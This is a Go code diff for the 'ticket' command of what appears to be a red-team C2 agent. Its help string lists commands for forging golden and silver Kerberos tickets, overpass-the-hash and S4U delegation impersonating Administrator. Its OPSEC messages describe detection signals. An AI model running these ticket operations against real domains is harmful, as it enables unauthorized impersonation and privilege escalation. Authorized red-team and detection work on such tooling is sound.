@@ -14,7 +14,7 @@ func init() {
 		HelpString:          "ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_aes256_key>\nticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <hex_key> -key_type rc4 -format ccache\nticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <hex_key> -spn MSSQLSvc/db01.corp.local:1433\nticket -action request -realm CORP.LOCAL -username admin -key <hex_key> -server dc01.corp.local\nticket -action s4u -realm CORP.LOCAL -username sqlsvc -key <hex_key> -server dc01.corp.local -impersonate Administrator -spn cifs/fileserver.corp.local",
 		Version:             1,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1134.001"},
+		MitreAttackMappings: []string{"T1558.001", "T1558.002", "T1550.002", "T1550.003", "T1134.001"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{
 				agentstructs.SUPPORTED_OS_WINDOWS,
@@ -180,7 +180,17 @@ func init() {
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			actionVal, _ := taskData.Args.GetStringArg("action")
-			msg := fmt.Sprintf("OPSEC WARNING: Kerberos ticket operation, action: %s (T1550.003). Pass-the-ticket and ticket injection are lateral movement techniques. Kerberos event logs (4768, 4769, 4770) record ticket operations.", actionVal)
+			msg := fmt.Sprintf("OPSEC WARNING: Kerberos ticket operation (%s). Kerberos event logs (4768/4769/4770) record all ticket requests.", actionVal)
+			switch actionVal {
+			case "forge":
+				msg += " Golden/Silver ticket forgery creates tickets without KDC interaction but forged tickets may have anomalous flags or lifetimes detectable by PAC validation."
+			case "request":
+				msg += " Overpass-the-Hash generates AS-REQ with pre-auth — indistinguishable from normal auth but encryption downgrade (RC4) is a detection signal."
+			case "s4u":
+				impersonate, _ := taskData.Args.GetStringArg("impersonate")
+				spn, _ := taskData.Args.GetStringArg("spn")
+				msg = fmt.Sprintf("OPSEC WARNING: S4U2 constrained delegation abuse (T1550.003). Impersonating %s to %s. S4U generates TGS-REQ with PA-FOR-USER padata (type 129) and cname-in-addl-tkt flag — both are high-fidelity detection signals. Event 4769 with Transited Services field populated indicates delegation chain.", impersonate, spn)
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID: taskData.Task.ID, Success: true,
 				OpsecPreBlocked: false, OpsecPreMessage: msg,
@@ -235,19 +245,25 @@ func init() {
 			}
 			action, _ := processResponse.TaskData.Args.GetStringArg("action")
 			switch action {
-			case "golden", "silver":
+			case "forge":
 				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
 					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
-						fmt.Sprintf("Kerberos %s ticket forged (T1558)", action))
+						"Kerberos ticket forged (T1558)")
 				}
-			case "overpass":
+			case "request":
 				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") {
 					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
-						"Overpass-the-Hash ticket obtained (T1550.002)")
+						"Overpass-the-Hash TGT obtained (T1550.002)")
 				}
-			case "list":
-				logOperationEvent(processResponse.TaskData.Task.ID,
-					"[DISCOVERY] Kerberos ticket cache enumeration", false)
+			case "s4u":
+				impersonate, _ := processResponse.TaskData.Args.GetStringArg("impersonate")
+				spn, _ := processResponse.TaskData.Args.GetStringArg("spn")
+				if strings.Contains(responseText, "success") || strings.Contains(responseText, "Success") || strings.Contains(responseText, "S4U2Proxy") {
+					tagTask(processResponse.TaskData.Task.ID, "CREDENTIAL",
+						fmt.Sprintf("S4U2 delegation: impersonated %s to %s (T1550.003)", impersonate, spn))
+					logOperationEvent(processResponse.TaskData.Task.ID,
+						fmt.Sprintf("[DELEGATION] S4U2Self+S4U2Proxy: impersonated %s → %s", impersonate, spn), true)
+				}
 			}
 			return response
 		},
